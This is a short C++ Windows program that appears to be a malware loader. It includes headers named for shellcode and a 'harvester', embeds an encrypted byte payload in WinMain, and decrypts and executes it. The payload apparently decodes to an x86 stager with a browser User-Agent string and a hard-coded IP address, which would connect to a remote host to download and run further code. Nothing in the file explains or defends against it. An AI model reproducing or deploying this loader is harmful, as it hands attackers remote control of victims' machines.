#include "./shellcode.h"
#include "./harvester.h"
#include "./rating_system.h"

#include <string>
#include <list>

using namespace std;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int cmdShow)
{
	unsigned char code[] =
		// Payload Length
		"\x2a\x02\x00\x00"
		// Nearest to Prime
		"\x0c\x00\x00\x00\x00\x00\x00\x00"
		// Encrypted Payload
		"\xf7\xe3\x82\x0b\x0b\x0b\x6b\x82\xee\x3a\xd9\x6f\x80\x59\x3b\x80\x59\x07\x80\x59\x1f\x80\x79\x23\x04\xbc\x41\x2d\x3a\xf4\x3a\xcb\xa7\x37\x6a\x77\x09\x27\x2b\xca\xc4\x06\x0a\xcc\xe9\xfb\x59\x5c\x80\x59\x1b\x80\x49\x37\x0a\xdb\x80\x4b\x73\x8e\xcb\x7f\x41\x0a\xdb\x5b\x80\x43\x13\x80\x53\x2b\x0a\xd8\xe8\x37\x42\x80\x3f\x80\x0a\xdd\x3a\xf4\x3a\xcb\xa7\xca\xc4\x06\x0a\xcc\x33\xeb\x7e\xff\x08\x76\xf3\x30\x76\x2f\x7e\xe9\x53\x80\x53\x2f\x0a\xd8\x6d\x80\x07\x40\x80\x53\x17\x0a\xd8\x80\x0f\x80\x0a\xdb\x82\x4f\x2f\x2f\x50\x50\x6a\x52\x51\x5a\xf4\xeb\x53\x54\x51\x80\x19\xe0\x8d\x56\x63\x65\x6e\x7f\x0b\x63\x7c\x62\x65\x62\x5f\x63\x47\x7c\x2d\x0c\xf4\xde\xe3\x8b\x0b\x0b\x0b\x46\x64\x71\x62\x67\x67\x6a\x24\x3e\x25\x3b\x2b\x23\x68\x64\x66\x7b\x6a\x7f\x62\x69\x67\x6e\x30\x2b\x46\x58\x42\x4e\x2b\x3a\x3b\x25\x3b\x30\x2b\x5c\x62\x65\x6f\x64\x7c\x78\x2b\x45\x5f\x2b\x3d\x25\x39\x30\x2b\x5c\x44\x5c\x3d\x3f\x30\x2b\x5f\x79\x62\x6f\x6e\x65\x7f\x24\x3d\x25\x3b\x30\x2b\x5f\x64\x7e\x68\x63\x30\x2b\x46\x4a\x47\x48\x41\x58\x22\x0b\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x53\x0b\x52\x3a\xf4\x5c\x5c\x5c\x5c\x5a\x63\x31\x5d\x72\xac\xf4\xde\xe2\x98\x0b\x0b\x0b\x50\x3a\xc2\x5a\x5a\x61\x08\x5a\x5a\x63\xb0\x0a\x0b\x0b\x58\x5b\x63\x5c\x82\x94\xcd\xf4\xde\x82\xc8\xe0\x71\x52\x3a\xd9\x59\x63\x0b\x39\xab\x8f\x59\x59\x59\x5a\x59\x5b\x63\xe0\x5e\x25\x30\xf4\xde\x82\xcd\x63\x8b\x38\x0b\x0b\x82\xeb\x61\x0f\x5b\x61\x14\x5d\x63\x7e\x4d\x95\x8d\xf4\xde\x3a\xf4\x5c\x5c\x5c\x5c\x5d\x63\x26\x0d\x13\x70\xf4\xde\x8e\xcb\x7f\x43\x3a\xf4\x8e\xfd\x7f\x0f\x82\xf2\xe0\x02\x63\xa1\xce\xe9\x56\xf4\xde\x82\xca\x63\x4e\x2a\x55\x3a\xf4\xde\x3a\xf4\x5c\x61\x0c\x5a\x5d\x5b\x63\xbc\x5c\xeb\x00\xf4\xde\xb4\x0b\x24\x0b\x0b\x32\xcc\x7e\x0f\x82\xd3\xe0\x81\x3a\xf4\xe0\x1e\xe0\x42\xe3\x8a\xf4\xf4\xf4\x24\x73\x3f\x6e\x40\x0b\x0b\x63\xfb\xbe\xa9\x5d\xf4\xde\x61\x4b\x63\x0b\x1b\x0b\x0b\x63\x0b\x0b\x4b\x0b\x5c\x63\x53\xaf\x58\xee\xf4\xde\x98\x58\x58\x82\xec\x5c\x63\x0b\x2b\x0b\x0b\x58\x5d\x63\x19\x9d\x82\xe9\xf4\xde\x8e\xcb\x7f\xc6\x80\x0c\x0a\xc8\x8e\xcb\x7e\xee\x53\xc8\xe3\x16\xf4\xf4\xf4\x3a\x3b\x25\x3c\x38\x25\x39\x33\x25\x33\x3c\x0b";

	shellcode* sc = new shellcode(code);
	sc->Run();
	delete sc;



	return 0;
}
